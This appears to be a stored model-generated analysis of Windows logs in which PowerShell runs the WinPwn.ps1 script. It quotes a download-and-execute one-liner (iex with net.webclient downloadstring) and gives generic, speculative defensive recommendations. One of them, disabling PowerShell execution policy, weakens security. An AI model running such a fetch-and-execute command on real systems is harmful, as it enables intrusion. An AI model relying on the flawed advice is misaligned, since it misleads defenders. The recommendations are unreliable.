{"file":"filtering\/gemma3_4b\/attack\/20250606_143748.jsonl","analysis":"This appears to be a log of suspicious activity related to malicious PowerShell scripts being executed on a Windows system. Here's a breakdown of the key findings:\n\n**Malicious Script Execution**\n\nThe logs show multiple instances of PowerShell executing scripts from a GitHub repository, specifically `WinPwn.ps1`. This script is likely used for malicious purposes, such as:\n\n1. Downloading and executing additional malware\n2. Stealing sensitive information (e.g., credentials, files)\n3. Compromising system security\n\n**Command-Line Arguments**\n\nThe command-line arguments (`command_line`) reveal that the PowerShell scripts are being executed with various flags and options, including:\n\n* `iex(new-object net.webclient).downloadstring('https:\/\/...')`: This line downloads a script from a GitHub repository using `Invoke-Expression` (iex) and executes it.\n* `-noninteractive -consoleoutput`: These flags disable interactive mode and output the results to the console.\n\n**Tasks and Activities**\n\nThe logs mention various tasks and activities, such as:\n\n1. **Provider Lifecycle**: This suggests that the malicious script is interacting with Windows management infrastructure components (e.g., WMI, WinRM).\n2. **User Account Management**: This indicates that the script may be attempting to manipulate user accounts or credentials.\n3. **Engine Lifecycle**: This could imply that the script is manipulating PowerShell's engine or configuration.\n\n**Recommendations**\n\nTo mitigate this threat:\n\n1. Review system logs for similar suspicious activity\n2. Investigate the GitHub repository and ensure it's not compromised\n3. Run a thorough antivirus scan on the affected systems\n4. Update Windows and PowerShell to the latest versions\n5. Implement additional security measures, such as:\n\t* Disabling PowerShell execution policy (if necessary)\n\t* Restricting access to sensitive directories or files\n\t* Configuring system auditing and monitoring tools\n\nPlease note that this is a general analysis, and specific recommendations may vary depending on your organization's environment and security policies."}
